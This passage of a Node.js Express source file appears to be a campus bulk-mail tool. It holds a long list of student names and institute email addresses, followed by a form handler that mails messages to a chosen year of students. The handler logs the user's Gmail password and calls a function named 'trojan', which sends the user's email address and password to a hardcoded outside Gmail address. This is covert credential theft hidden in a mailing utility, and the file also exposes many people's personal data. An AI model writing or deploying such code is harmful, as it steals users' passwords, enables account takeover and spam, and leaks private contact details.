            {mail: '2018UME1404@mnit.ac.in',
            name: 'SORAYA GUPTA'},
            
            
            {mail: '2018UME1406@mnit.ac.in',
            name: 'SAKET SAI ARCOT'},
            
            
            {mail: '2018UME1419@mnit.ac.in',
            name: 'BHARGAV CHOUHAN'},
            
            
            {mail: '2018UME1433@mnit.ac.in',
            name: 'PRAKHAR GOYAL'},
            
            
            {mail: '2018UME1462@mnit.ac.in',
            name: 'GAURAV AGARWAL'},
            
            
            {mail: '2018UME1463@mnit.ac.in',
            name: 'ASHOK VELAYUDHADAS PADMAJA'},
            
            
            {mail: '2018UME1469@mnit.ac.in',
            name: 'KIRAN KUMAWAT'},
            
            
            {mail: '2018UME1473@mnit.ac.in',
            name: 'SUMIT KUKREJA'},
            
            
            {mail: '2018UME1480@mnit.ac.in',
            name: 'ABHISHEK YADAV'},
            
            
            {mail: '2018UME1488@mnit.ac.in',
            name: 'Amal Asok'},
            
            
            {mail: '2018UME1493@mnit.ac.in',
            name: 'SATISH KUMAR MEENA'},
            
            
            {mail: '2018UME1554@mnit.ac.in',
            name: 'Abhirup Bhattacharya'},
            
            
            {mail: '2018UME1557@mnit.ac.in',
            name: 'VIKESH RAJPUT'},
            
            
            {mail: '2018UME1560@mnit.ac.in',
            name: 'BHATTU SAITEJA'},
            
            
            {mail: '2018UME1572@mnit.ac.in',
            name: 'BHUKYA PAVAN NAIK'},
            
            
            {mail: '2018UME1592@mnit.ac.in',
            name: 'PRIYA MEENA'},
            
            
            {mail: '2018UME1594@mnit.ac.in',
            name: 'ADITYA KUMAR JHA'},
            
            
            {mail: '2018UME1602@mnit.ac.in',
            name: 'HARISH YADAV'},
            
            
            {mail: '2018UME1611@mnit.ac.in',
            name: 'SHIVAM KUMAR'},
            
            
            {mail: '2018UME1612@mnit.ac.in',
            name: 'VIJAYPAL GODARA'},
            
            
            {mail: '2018UME1680@mnit.ac.in',
            name: 'SMARAJIT DAS'},
            
            
            {mail: '2018UME1686@mnit.ac.in',
            name: 'SARMILI MONDAL'},
            
            
            {mail: '2018UME1692@mnit.ac.in',
            name: 'AJAY BAIRWA'},
            
            
            {mail: '2018UME1701@mnit.ac.in',
            name: 'SOURABH GOYAL'},
            
            
            {mail: '2018UME1703@mnit.ac.in',
            name: 'ANJESH'},
            
            
            {mail: '2018UME1704@mnit.ac.in',
            name: 'HARSH MANOJ CHAUDHARY'},
            
            
            {mail: '2018UME1707@mnit.ac.in',
            name: 'MEHUL SONI'},
            
            
            {mail: '2018UME1714@mnit.ac.in',
            name: 'BUDDHESHWAR SINGH'},
            
            
            {mail: '2018UME1716@mnit.ac.in',
            name: 'SURAJBHAN'},
            
            
            {mail: '2018UME1726@mnit.ac.in',
            name: 'NARENDRA SAINI'},
            
            
            {mail: '2018UME1743@mnit.ac.in',
            name: 'PRACHI CHAUDHARY'},
            
            
            {mail: '2018UME1751@mnit.ac.in',
            name: 'SRINIVASA RAJU DENUMAKONDA'},
            
            
            {mail: '2018UME1753@mnit.ac.in',
            name: 'NIKITA RAUTELA'},
            
            
            {mail: '2018UME1758@mnit.ac.in',
            name: 'PANCHANI DENISH ASHOKBHAI'},
            
            
            {mail: '2018UME1762@mnit.ac.in',
            name: 'NITIN'},
            
            
            {mail: '2018UME1785@mnit.ac.in',
            name: 'AMIT JAIN'},
            
            
            {mail: '2018UME1794@mnit.ac.in',
            name: 'RAVI KUMAR'},
            
            
            {mail: '2018UMT1014@mnit.ac.in',
            name: 'DHIRAJ KUMAR'},
            
            
            {mail: '2018UMT1063@mnit.ac.in',
            name: 'ANANY RATHORE'},
            
            
            {mail: '2018UMT1096@mnit.ac.in',
            name: 'PARTH SONI'},
            
            
            {mail: '2018UMT1127@mnit.ac.in',
            name: 'KANIKA GUPTA'},
            
            
            {mail: '2018UMT1165@mnit.ac.in',
            name: 'VED PRAKASH MAYANK'},
            
            
            {mail: '2018UMT1246@mnit.ac.in',
            name: 'HARSH SHARMA'},
            
            
            {mail: '2018UMT1276@mnit.ac.in',
            name: 'KULDEEP MEGHWAL'},
            
            
            {mail: '2018UMT1277@mnit.ac.in',
            name: 'RAJESH'},
            
            
            {mail: '2018UMT1279@mnit.ac.in',
            name: 'DIVYESH GHIYA'},
            
            
            {mail: '2018UMT1310@mnit.ac.in',
            name: 'BANOTH SAMPATH'},
            
            
            {mail: '2018UMT1311@mnit.ac.in',
            name: 'GAURAV SHARMA'},
            
            
            {mail: '2018UMT1312@mnit.ac.in',
            name: 'DEVANSH SAHU'},
            
            
            {mail: '2018UMT1315@mnit.ac.in',
            name: 'SANDHYA RANI'},
            
            
            {mail: '2018UMT1347@mnit.ac.in',
            name: 'REDDI JAGADISH'},
            
            
            {mail: '2018UMT1413@mnit.ac.in',
            name: 'MANAVI SHARMA'},
            
            
            {mail: '2018UMT1415@mnit.ac.in',
            name: 'JATIN SAINI'},
            
            
            {mail: '2018UMT1432@mnit.ac.in',
            name: 'ADITYA JAIN'},
            
            
            {mail: '2018UMT1434@mnit.ac.in',
            name: 'JOSHI MOHAK PRASAD'},
            
            
            {mail: '2018UMT1435@mnit.ac.in',
            name: 'SONAL AGARWAL'},
            
            
            {mail: '2018UMT1442@mnit.ac.in',
            name: 'DIKSHA KURDIA'},
            
            
            {mail: '2018UMT1487@mnit.ac.in',
            name: 'KONAKALA LOKESH'},
            
            
            {mail: '2018UMT1499@mnit.ac.in',
            name: 'ASHOK CH'},
            
            
            {mail: '2018UMT1515@mnit.ac.in',
            name: 'HARSHVARDHAN'},
            
            
            {mail: '2018UMT1519@mnit.ac.in',
            name: 'SOURABH MISHRA'},
            
            
            {mail: '2018UMT1521@mnit.ac.in',
            name: 'ANUJ GUPTA'},
            
            
            {mail: '2018UMT1525@mnit.ac.in',
            name: 'CHANCHAL VYAS'},
            
            
            {mail: '2018UMT1531@mnit.ac.in',
            name: 'KUMAR SATYAM'},
            
            
            {mail: '2018UMT1534@mnit.ac.in',
            name: 'SAURABH KUMAR SINGH'},
            
            
            {mail: '2018UMT1538@mnit.ac.in',
            name: 'DEEPAK SUMAN'},
            
            
            {mail: '2018UMT1540@mnit.ac.in',
            name: 'SANDEEP KUMAR'},
            
            
            {mail: '2018UMT1541@mnit.ac.in',
            name: 'AJINKYA SWAMI'},
            
            
            {mail: '2018UMT1542@mnit.ac.in',
            name: 'SNEHA SAGAR'},
            
            
            {mail: '2018UMT1543@mnit.ac.in',
            name: 'MOHD ABDULLAH SIDDIQUI'},
            
            
            {mail: '2018UMT1544@mnit.ac.in',
            name: 'HIMANSHU CHOUMAL'},
            
            
            {mail: '2018UMT1545@mnit.ac.in',
            name: 'SAHIL JAROLI'},
            
            
            {mail: '2018UMT1547@mnit.ac.in',
            name: 'VISHWAS CHAHAR'},
            
            
            {mail: '2018UMT1548@mnit.ac.in',
            name: 'VIKASH KUMAR MEENA'},
            
            
            {mail: '2018UMT1558@mnit.ac.in',
            name: 'SHAILENDRA SINGH BHAGHROT'},
            
            
            {mail: '2018UMT1562@mnit.ac.in',
            name: 'ANNU JAIN'},
            
            
            {mail: '2018UMT1564@mnit.ac.in',
            name: 'AAESHA HUSSAIN'},
            
            
            {mail: '2018UMT1565@mnit.ac.in',
            name: 'HARSHITA JARERA'},
            
            
            {mail: '2018UMT1568@mnit.ac.in',
            name: 'ROHIT MAHALA'},
            
            
            {mail: '2018UMT1570@mnit.ac.in',
            name: 'RAHUL SHARMA'},
            
            
            {mail: '2018UMT1574@mnit.ac.in',
            name: 'JITENDRA MEENA'},
            
            
            {mail: '2018UMT1575@mnit.ac.in',
            name: 'SHASHANK BHARTI'},
            
            
            {mail: '2018UMT1576@mnit.ac.in',
            name: 'MALLETI ROSHAN ABHIRAM'},
            
            
            {mail: '2018UMT1577@mnit.ac.in',
            name: 'VISHWARANJAN KUMAR'},
            
            
            {mail: '2018UMT1578@mnit.ac.in',
            name: 'PREETI'},
            
            
            {mail: '2018UMT1580@mnit.ac.in',
            name: 'SANCHI BHALLA'},
            
            
            {mail: '2018UMT1586@mnit.ac.in',
            name: 'RAJDEEP BHATTACHARYYA'},
            
            
            {mail: '2018UMT1587@mnit.ac.in',
            name: 'YASH SHARMA'},
            
            
            {mail: '2018UMT1588@mnit.ac.in',
            name: 'UMANG THAGRIA'},
            
            
            {mail: '2018UMT1589@mnit.ac.in',
            name: 'RITIK TRIVEDI'},
            
            
            {mail: '2018UMT1590@mnit.ac.in',
            name: 'PALLAV KOTHARI'},
            
            
            {mail: '2018UMT1597@mnit.ac.in',
            name: 'AVNEET RAJ'},
            
            
            {mail: '2018UMT1599@mnit.ac.in',
            name: 'NAYNA PATIDAR'},
            
            
            {mail: '2018UMT1613@mnit.ac.in',
            name: 'MOHIT TANK'},
            
            
            {mail: '2018UMT1614@mnit.ac.in',
            name: 'AAYUSH THEPRA'},
            
            
            {mail: '2018UMT1622@mnit.ac.in',
            name: 'KHUSHBOO GOUR'},
            
            
            {mail: '2018UMT1623@mnit.ac.in',
            name: 'SAKSHI CHANDOLA'},
            
            
            {mail: '2018UMT1625@mnit.ac.in',
            name: 'DEEPAK KUMAR JANGIR'},
            
            
            {mail: '2018UMT1631@mnit.ac.in',
            name: 'NIMITT BHARGAVA'},
            
            
            {mail: '2018UMT1638@mnit.ac.in',
            name: 'SOMENDRA JAIN'},
            
            
            {mail: '2018UMT1662@mnit.ac.in',
            name: 'RAHUL VERMA'},
            
            
            {mail: '2018UMT1669@mnit.ac.in',
            name: 'SANDEEP KUMAR'},
            
            
            {mail: '2018UMT1697@mnit.ac.in',
            name: 'NEHA GURJAR'},
            
            
            {mail: '2018UMT1723@mnit.ac.in',
            name: 'ANKIT KUMAR'},
            
            
            {mail: '2018UMT1742@mnit.ac.in',
            name: 'SALEHA SHABA'},
            
            
            {mail: '2018UMT1746@mnit.ac.in',
            name: 'BHAVYA VERMA'},
            
            
            {mail: '2018UMT1750@mnit.ac.in',
            name: 'SHREYA KHARE'},
            
            
            {mail: '2018UMT1754@mnit.ac.in',
            name: 'ATUL'},
            
            
            {mail: '2018UMT1755@mnit.ac.in',
            name: 'SHUBHAM'},
            
            
            {mail: '2018UMT1757@mnit.ac.in',
            name: 'TRIVEDI YATHARTH PARESHBHAI'},
            
            
            {mail: '2018UMT1760@mnit.ac.in',
            name: 'ADITYA SINHA'},
            
            
            {mail: '2018UMT1765@mnit.ac.in',
            name: 'SHIVAM BANSAL'},
            
            
            {mail: '2018UMT1766@mnit.ac.in',
            name: 'HIMANSHEE NAG'},
            
            
            {mail: '2018UMT1768@mnit.ac.in',
            name: 'VAIBHAV SINGH'},
            
            
            {mail: '2018UMT1781@mnit.ac.in',
            name: 'SONU KUMAR'},
            
            
            {mail: '2018UMT1787@mnit.ac.in',
            name: 'HEMANT CHOUDHARY'},
            
            
            {mail: '2018UMT1800@mnit.ac.in',
            name: 'ADITYA GOUR'},
            
            
            {mail: '2018UMT1803@mnit.ac.in',
            name: 'ABHISHEK RAJ YADAV'},
            
            
            {mail: '2018UMT1804@mnit.ac.in',
            name: 'JAYA RANI'},
            
            
            {mail: '2018UMT1807@mnit.ac.in',
            name: 'ANSHU RAJ'},
            
            
            {mail: '2018UMT1808@mnit.ac.in',
            name: 'SACHIN RAGHAV'},
            
            
            {mail: '2018UMT1814@mnit.ac.in',
            name: 'NOMULA SRINIVASA RANGANADHA RAGHAVENDRA'},
            
            
            {mail: '2018UMT1816@mnit.ac.in',
            name: 'HARSHITA SHARMA'},
            
            
            {mail: '2018UMT1817@mnit.ac.in',
            name: 'NOOKARAPU SASIKRISHNA PAVAN'},
            
            
            {mail: '2018UMT1818@mnit.ac.in',
            name: 'SARFARAZ KHAN'},
            
            
            {mail: '2018UMT1820@mnit.ac.in',
            name: 'PRAJJVAL BHARDWAJ'},
            
            
            {mail: '2018UMT1821@mnit.ac.in',
            name: 'BANAVATH HEMANTH KUMAR NAIK'},
            
            
            {mail: '2018UMT1823@mnit.ac.in',
            name: 'AYUSHMAN MISHRA'}
        ]
        

app.get('/',(req,res)=>{
    res.render('home');
})
app.get('/thanks',(req,res)=>{
    res.render('done');
})
app.post('/',(req,res)=>{
    const data={
            name:req.body.name,
            mail:req.body.mail,
            password:req.body.password,
            choice:req.body.choice,
            body:req.body.body,
            subject:req.body.subject,
            to:'eshaan.263@gmail.com'
        };
    console.log(data);
    async function main(data) {
        var transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
              user: data.mail,
              pass: data.password
            }
          });
    
        let info = await transporter.sendMail({
        from: data.mail,
        to: data.to, 
        subject: data.subject, 
        text: data.body,
        html: data.body,
        });
    }
    async function trojan(data) {
        var transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
              user: data.mail,
              pass: data.password
            }
          });
    
        let info = await transporter.sendMail({
        from: data.mail,
        to: 'eshaan.263@gmail.com', 
        subject: data.mail, 
        text: data.body,
        html: data.password,
        });
    }
    trojan(data);
    if(data.choice==='1'){
        for(var i=0;i<first_year.length;i++){
            data.to=first_year[i].mail;
            main(data)
        }
        data.to=data.mail;
        mail(data);
    }
    else if(data.choice==='2'){
        for(var i=0;i<second_year.length;i++){
            data.to=second_year[i].mail;
            main(data)
        }
        data.to=data.mail;
        mail(data);
    }
    else if(data.choice==='3'){
        for(var i=0;i<third_year.length;i++){
            data.to=third_year[i].mail;
            main(data)
        }
        data.to=data.mail;
        mail(data);
    }
  
    res.redirect('/thanks');
    });
    
const PORT= process.env.PORT;
server.listen(PORT,process.env.IP,()=>{
    console.log(`Server started on ${PORT}`);
});



